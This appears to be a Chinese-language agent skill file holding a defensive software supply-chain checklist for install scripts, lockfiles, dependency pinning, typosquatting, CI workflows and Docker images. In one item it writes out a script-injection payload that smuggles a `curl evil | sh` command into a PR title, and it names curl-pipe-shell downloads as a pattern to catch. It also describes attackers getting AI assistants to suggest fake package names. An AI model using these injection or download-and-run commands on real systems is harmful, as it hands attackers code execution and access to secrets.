---
name: supply-chain
description: 软件供应链排查清单：依赖安装脚本、lockfile 与版本固定、新版本冷却期、新增依赖审批、仿冒包与依赖混淆、CI 流水线与发布权限、镜像与下载脚本。
---
# 软件供应链排查清单

## 安装脚本
### 1. CI 和构建镜像里安装依赖时会执行依赖包的安装脚本
- 问题：依赖包可以在 `postinstall` 这类脚本里运行任意命令。2025 年 9 月的 Shai-Hulud 蠕虫就是给被盗账号维护的包注入 post-install 脚本，偷走开发者和 CI 里的各种密钥，再用偷到的 npm 令牌继续感染别的包。
- 怎么认出：npm 11 及以下：CI 配置或 Dockerfile 里写 `npm ci`、`npm install` 却没有 `--ignore-scripts`，`.npmrc` 里也没有 `ignore-scripts=true`。npm 12 起依赖脚本默认被拦截，要看根 `package.json` 的 `allowScripts` 是否放得太宽，或是否用了 `--dangerously-allow-all-scripts`。yarn 1 同样看有没有 `--ignore-scripts`；yarn 2 及以上没有这个参数，看 `.yarnrc.yml` 里是否写了 `enableScripts: true`（当前文档称默认 false）。同一台机器上同时放着发布令牌、云凭证，风险更大。
- 修法：npm 11 及以下用 `npm ci --ignore-scripts`，或在 `.npmrc` 写 `ignore-scripts=true`；npm 12 起只在 `allowScripts` 里列确实要跑脚本的包；yarn 2 及以上保持 `enableScripts` 为 false；构建机器上不放发布令牌；需要运行的脚本按下一项单独处理。
- 出处：https://github.blog/security/supply-chain-security/our-plan-for-a-more-secure-npm-supply-chain/ https://www.cisa.gov/news-events/alerts/2025/09/23/widespread-supply-chain-compromise-impacting-npm-ecosystem https://github.com/npm/cli/releases/tag/v12.0.0 https://yarnpkg.com/configuration/yarnrc

### 2. 屏蔽脚本后，需要编译的原生包没有单独构建
- 问题：`sharp`、`bcrypt`、`esbuild` 这类包的安装脚本负责下载或编译二进制。全局屏蔽脚本后它们装不好，有人为了图省事就把屏蔽整个关掉。
- 怎么认出：为了让构建通过，把 `--ignore-scripts` 删掉，或把 `ignore-scripts=false` 提交进 `.npmrc`；npm 12 起则是把 `--dangerously-allow-all-scripts` 加进了命令；README 里写着"安装失败请不要加 ignore-scripts"。
- 修法：保持屏蔽，在安装之后只对确实需要的包执行 `npm rebuild <包名>`（npm 12 起先在 `allowScripts` 里批准这几个包），并把包名写进构建脚本，新增的包要评审后才能加入。
- 出处：https://docs.npmjs.com/cli/v12/commands/npm-rebuild

### 3. pnpm 或 bun 的脚本白名单写得太宽
- 问题：pnpm 10 起默认不执行依赖包的安装脚本；bun 只对 `trustedDependencies` 里的包和它内置的热门包清单执行脚本。白名单放得太宽，保护就等于关掉。
- 怎么认出：pnpm：`pnpm-workspace.yaml` 或 `package.json` 里出现 `dangerouslyAllowAllBuilds: true`，或白名单列了十几个包、其中有不需要编译的纯 JS 包。bun：`package.json` 里没有 `trustedDependencies` 字段（这时 bun 沿用内置清单），或这个字段列了很多包。
- 修法：白名单只放确实要构建的原生包。pnpm 10.26.0 起可以用 `allowBuilds`（pnpm 11 起它取代了已删除的 `onlyBuiltDependencies`），可以把版本一起写上；bun 把 `trustedDependencies` 写成 `[]`，或只列少数包；更新这些包的版本时重新评审。
- 出处：https://pnpm.io/supply-chain-security https://bun.sh/docs/pm/lifecycle

## 锁定与版本
### 4. CI 的安装命令允许改写 lockfile
- 问题：lockfile（依赖锁定文件，记录每个依赖的确切版本和校验值）在 CI 里被重新解析后，装到的版本可能和评审过的不一样。
- 怎么认出：CI 里用 `bun install` 却没有 `--frozen-lockfile`（`bun ci` 等价，算合格）；用 `pip install -r` 且没有哈希；`npm install` 代替了 `npm ci`。yarn 2 及以上在 CI 环境里默认开启 `enableImmutableInstalls`，不带 `--immutable` 不算问题，除非 `.yarnrc.yml` 把它显式设成 false。
- 修法：CI 一律用冻结安装：`npm ci`、`bun ci`、`pnpm install --frozen-lockfile`；yarn 保持 CI 默认或显式加 `--immutable`；pip 用 `--require-hashes`；lockfile 与清单不一致时让 CI 直接失败。
- 出处：https://cheatsheetseries.owasp.org/cheatsheets/NPM_Security_Cheat_Sheet.html https://pip.pypa.io/en/stable/topics/secure-installs/ https://bun.sh/docs/pm/cli/install https://yarnpkg.com/configuration/yarnrc

### 5. lockfile 的变更没有人审
- 问题：lockfile 是机器生成的大文件，评审时容易整个跳过，恶意改动（把依赖地址换成外部站点、去掉校验值）会混进去。
- 怎么认出：PR 里 lockfile 的 `resolved` 字段出现非官方仓库地址、`git+ssh://`、IP 地址；某个包条目缺少 `integrity`；清单没变而 lockfile 大面积变化。
- 修法：评审 PR 时对 lockfile 的 diff 至少检查来源域名和 `integrity`；增加 CI 检查，限制 `resolved` 只能来自团队允许的仓库；清单没变就不应该有版本变化。
- 出处：https://docs.npmjs.com/cli/v12/configuring-npm/package-lock-json

### 6. 依赖版本用范围写法，没有固定到确切版本（save-exact）
- 问题：`^1.2.3` 这样的范围会在安装时自动取到 1.x 的最新版，某个依赖被投毒的新版本发布后，下一次没有 lockfile 保护的安装就会带进来。
- 怎么认出：`package.json` 里依赖版本以 `^`、`~`、`*`、`>=` 开头；`.npmrc` 里没有 `save-exact=true`。
- 修法：`.npmrc` 写 `save-exact=true`，让 `npm install` 默认写入确切版本；已有的范围写法在升级依赖时一并改成确切版本，之后由 lockfile 加评审控制升级。
- 出处：https://docs.npmjs.com/cli/v12/using-npm/config#save-exact

### 7. 依赖指向 git 地址、压缩包地址或 latest
- 问题：这类依赖不经过仓库的版本和校验机制，目标仓库被改、压缩包被替换后，下次安装会拿到不同的内容。
- 怎么认出：`package.json` 里依赖值是 `github:user/repo`、`git+https://...`、`https://....tgz`、`latest`；`requirements.txt` 里有 `git+https://` 而没有固定到提交号。npm 12 起 `allow-git`、`allow-remote` 默认是 none，这类依赖默认装不上，所以看到有人在 `.npmrc` 把它们设成 `all` 要追问理由。
- 修法：改用仓库里的正式版本；确实要引用 git 时固定到完整的提交哈希；pnpm 10.26 起可以用 `blockExoticSubdeps` 禁止间接依赖使用这类来源（pnpm 11 起默认开启）。
- 出处：https://docs.npmjs.com/cli/v12/using-npm/config https://docs.npmjs.com/cli/v12/configuring-npm/package-json#dependencies https://pnpm.io/supply-chain-security

### 8. 新发布的版本一出来就升级，没有冷却期
- 问题：被投毒的版本通常几小时内就会被发现并下架，但在这个窗口里升级的项目已经中招。等一等就能避开大部分此类事件。
- 怎么认出：升级依赖的 PR 引入的版本发布时间不到几天；包管理器没有配置冷却期。
- 修法：设置发布后最短等待时间（冷却期），建议至少 3 到 7 天：npm 11.10 起用 `min-release-age`（单位天；v12 文档同样有），pnpm 10.16 起用 `minimumReleaseAge`（单位分钟，pnpm 11 起默认 1 天），yarn 4.10 起用 `npmMinimalAgeGate`（写法是带单位的字符串，文档示例为 "1w"），bun 用 `install.minimumReleaseAge`（单位秒）；紧急的安全修复可以按包例外。
- 出处：https://pnpm.io/supply-chain-security https://docs.npmjs.com/cli/v12/using-npm/config https://yarnpkg.com/configuration/yarnrc https://bun.sh/docs/runtime/bunfig#install-minimumreleaseage

### 9. 升级机器人的冷却期没有写成团队约定的天数
- 问题：Dependabot 和 Renovate 自动开升级 PR，合并的人看到测试通过就放行。冷却期不明确写在配置里，天数就由默认值或某个人随手决定。
- 怎么认出：`.github/dependabot.yml` 里没有 `cooldown`，或 `default-days` 设成 0、1；`renovate.json` 里没有 `minimumReleaseAge`。
- 修法：Dependabot 的版本更新默认等 3 天（文档原文，安全更新不受冷却影响），想和包管理器的冷却期一致，就在每个 `updates` 条目下写 `cooldown: default-days: 7`；Renovate 用 `minimumReleaseAge: "7 days"`。
- 出处：https://docs.github.com/en/code-security/reference/supply-chain-security/dependabot-options-reference https://docs.renovatebot.com/configuration-options/#minimumreleaseage

### 10. 新增第三方依赖没有经过用户同意
- 问题：每多一个依赖，就多一个能在你的构建机和生产环境里执行代码的维护者；代码里能用标准库或现有依赖解决的，引入新包只增加攻击面。
- 怎么认出：diff 里 `package.json` 的 `dependencies`/`devDependencies`、`go.mod`、`requirements.txt`、`pom.xml` 新增了条目，而需求描述里没有提到。
- 修法：新增依赖前先向用户说明用途、能否用标准库或现有依赖替代、维护状态和下载量，得到经用户同意后再加；未获同意的依赖不提交。
- 出处：https://cheatsheetseries.owasp.org/cheatsheets/NPM_Security_Cheat_Sheet.html

### 11. 新增的依赖名和知名包只差一两个字符
- 问题：攻击者注册拼写相近的包名（仿冒包），等人手滑装错，或让 AI 助手"推荐"出一个不存在的名字再抢注。
- 怎么认出：diff 里新增的包名和常用包很像（`reqeusts`、`lodahs`），周下载量极低、发布时间很近、没有关联的源码仓库。
- 修法：新增依赖时对照官方文档里写的包名逐字符核对；检查发布者、仓库地址和下载量；可疑的先别装。
- 出处：https://cheatsheetseries.owasp.org/cheatsheets/NPM_Security_Cheat_Sheet.html

### 12. 私有包名没有绑定到私有仓库（依赖混淆）
- 问题：依赖混淆：公司内部包名没有在公共仓库占位，攻击者在公共仓库发布同名、版本号更高的包，构建时包管理器选了它。
- 怎么认出：内部包没有使用 scope（`@公司名/包名`），或 `.npmrc` 里没有 `@公司名:registry=` 把该 scope 指向私有仓库；pip 同时配了 `--extra-index-url`。
- 修法：内部包统一加 scope，并在 `.npmrc` 中把 scope 固定指向私有仓库；pip 用单一的索引（私有仓库代理公共包）而不是 `--extra-index-url`；在公共仓库注册你的 scope 名。
- 出处：https://docs.npmjs.com/cli/v12/using-npm/scope

### 13. .npmrc 或配置文件里提交了仓库令牌
- 问题：写在 `.npmrc` 里的 `_authToken` 会随代码进仓库和镜像，任何能读代码的人都能用它发布或读取私有包。
- 怎么认出：`.npmrc`、`.yarnrc.yml`、`pip.conf` 里有 `_authToken=npm_...`、`//registry.../:_authToken=` 后面是明文。
- 修法：配置文件里写 `_authToken=${NPM_TOKEN}`，令牌通过 CI 的密钥注入；令牌用只读且限定包范围；已经提交过的令牌立即吊销重发。
- 出处：https://docs.npmjs.com/cli/v12/configuring-npm/npmrc

### 14. CI 里没有校验包的签名和来源证明
- 问题：即使包名对、版本对，包内容也可能不是原作者的构建产物。npm 提供签名和来源证明可以检查。
- 怎么认出：CI 流程里安装依赖之后没有 `npm audit signatures` 步骤。
- 修法：安装后加一步 `npm audit signatures`，失败则中断构建；该命令同时会验证已下载包的来源证明（provenance）。
- 出处：https://docs.npmjs.com/cli/v12/commands/npm-audit

## 持续集成流水线
### 15. 第三方 Action 用标签引用，没有固定到提交哈希
- 问题：标签可以被改指向别的提交，Action 的作者被入侵后，你的流水线下次运行就会执行恶意代码并泄漏密钥。
- 怎么认出：本次改动涉及 workflow 文件时：`uses: owner/action@v3`、`@main`，而不是 40 位的提交哈希；仓库里还没有 `.github/workflows/actions.lock` 这个依赖锁文件。
- 修法：GitHub 官方推荐的最强做法是 workflow 依赖 lockfile（由 `gh actions-lock` 生成 `.github/workflows/actions.lock`，记录每个 Action 的精确提交，包括间接依赖；文档注明目前是 public preview，可能变化）；暂时不能采用时，改成 `uses: owner/action@<完整提交哈希> # v3.1.0`，并用升级机器人维护这些哈希；固定时确认哈希来自 Action 自己的仓库而不是 fork。
- 出处：https://docs.github.com/en/actions/reference/security/secure-use https://docs.github.com/en/actions/concepts/security/workflow-dependency-lockfiles

### 16. workflow 没有声明最小权限
- 问题：`GITHUB_TOKEN` 的默认权限可能很大（取决于仓库和组织的设置），任何一个被攻陷的步骤都能用它改代码、发版本。
- 怎么认出：本次改动涉及 workflow 文件时：顶层没有 `permissions:`；写成 `permissions: write-all`；每个任务都有 `contents: write` 而只有一个任务需要。
- 修法：顶层写 `permissions: contents: read`，需要更多权限的任务单独声明；发布任务才给 `id-token: write`、`packages: write`。
- 出处：https://docs.github.com/en/actions/reference/security/secure-use

### 17. pull_request_target 里检出并运行 PR 的代码
- 问题：`pull_request_target` 在基础仓库的上下文里运行，带有密钥和写权限；如果它检出来自 fork 的代码并构建或测试，外部贡献者的代码就能拿到这些密钥。
- 怎么认出：workflow 触发器是 `pull_request_target` 或 `workflow_run`，步骤里有 `actions/checkout` 且 `ref: ${{ github.event.pull_request.head.sha }}`，后面接着安装依赖、运行脚本。
- 修法：需要密钥的操作和运行 PR 代码的操作拆成两个 workflow；运行不可信代码的那个用 `pull_request` 触发，不给密钥；`pull_request_target` 只做打标签、评论这类不运行 PR 代码的事。
- 出处：https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/

### 18. 把 PR 标题、分支名等不可信文本直接插进 run 脚本
- 问题：`${{ github.event.pull_request.title }}` 在脚本执行前就被替换成文本，标题里写 `"; curl evil | sh #` 就会变成命令（脚本注入）。
- 怎么认出：`run:` 的多行脚本里直接出现 `${{ github.event.* }}`、`${{ github.head_ref }}`。
- 修法：先把值放进环境变量：`env: TITLE: ${{ github.event.pull_request.title }}`，脚本里用 `"$TITLE"` 引用（带双引号）。
- 出处：https://docs.github.com/en/actions/reference/security/secure-use

### 19. 发布流水线使用长期有效的发布令牌
- 问题：长期令牌一旦泄露，攻击者就能以你的名义发布恶意版本，Shai-Hulud 就是靠偷到的令牌自我传播的。
- 怎么认出：发布 workflow 里 `NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}` 后面接 `npm publish`；令牌没有设过期时间。
- 修法：改用 npm 的可信发布（trusted publishing）：流水线用 OIDC（OpenID Connect，CI 向 npm 出示自己的身份证明来换取临时凭证的标准）换取短期凭证，workflow 加 `permissions: id-token: write`，并在 npm 包设置里绑定仓库和 workflow；发布时附带来源证明。
- 出处：https://docs.npmjs.com/trusted-publishers

### 20. 发布包时把不该发的文件一起打进去
- 问题：没有限定发布内容时，`.env`、测试数据、内部文档可能跟着包一起公开发布到仓库。
- 怎么认出：`package.json` 里没有 `files` 字段，也没有 `.npmignore`；项目根目录有 `.env`、凭证文件。
- 修法：用 `files` 白名单只列需要发布的目录；发布前运行 `npm pack --dry-run` 查看清单；CI 里把该命令的输出做个检查。
- 出处：https://docs.npmjs.com/cli/v12/configuring-npm/package-json#files

### 21. CI 或 Dockerfile 里全局安装工具不带版本
- 问题：`npm install -g some-cli` 或 `npx some-cli` 每次取当前最新版，工具被投毒后，下一次构建就会执行它，而且有权限接触构建里的密钥。
- 怎么认出：Dockerfile 或 workflow 里 `npm i -g`、`npx`、`pip install` 后面没有版本号；`curl` 下载安装脚本时没有固定版本。
- 修法：所有工具写确切版本：`npm i -g some-cli@1.4.2`；更常见的做法是放进项目的 `devDependencies` 由 lockfile 固定，然后用 `npx --no-install`。
- 出处：https://docs.npmjs.com/cli/v12/commands/npm-install

## 镜像与下载
### 22. Dockerfile 的基础镜像用 latest 或浮动标签
- 问题：同一个标签今天和明天可能指向不同镜像，构建结果不可复现，被投毒的镜像也会自动被拉进来。
- 怎么认出：`FROM node:latest`、`FROM python:3`；没有 `@sha256:` 摘要。
- 修法：固定到具体版本和摘要：`FROM node:22.11.0-slim@sha256:<摘要>`；用升级机器人定期更新摘要。
- 出处：https://docs.docker.com/build/building/best-practices/#pin-base-image-versions

### 23. 下载脚本或二进制后直接执行，没有校验
- 问题：`curl ... | sh` 下载到什么就执行什么，下载地址被劫持或被替换，构建环境就被控制。
- 怎么认出：Dockerfile、CI 脚本里 `curl -sSL https://... | sh`、`wget` 下载可执行文件后直接 `chmod +x`，旁边没有 `sha256sum -c`。
- 修法：下载到文件，对照发布页提供的校验值或签名验证，通过之后才执行；校验值写在脚本里并固定版本；能用系统包管理器安装的优先用它。
- 出处：https://cwe.mitre.org/data/definitions/494.html

### 24. 包管理器关闭了 TLS 校验或信任了无 HTTPS 的主机
- 问题：关掉证书校验后，中间人可以替换下载的包内容，前面所有版本固定和校验措施都被绕过。
- 怎么认出：`.npmrc` 里 `strict-ssl=false`；pip 命令或配置里有 `--trusted-host`、`PIP_TRUSTED_HOST`。
- 修法：删除这些配置；公司代理使用自签证书时，把证书配置进 `cafile`（npm）或 `--cert`（pip），而不是关闭校验。
- 出处：https://docs.npmjs.com/cli/v12/using-npm/config https://pip.pypa.io/en/stable/cli/pip/
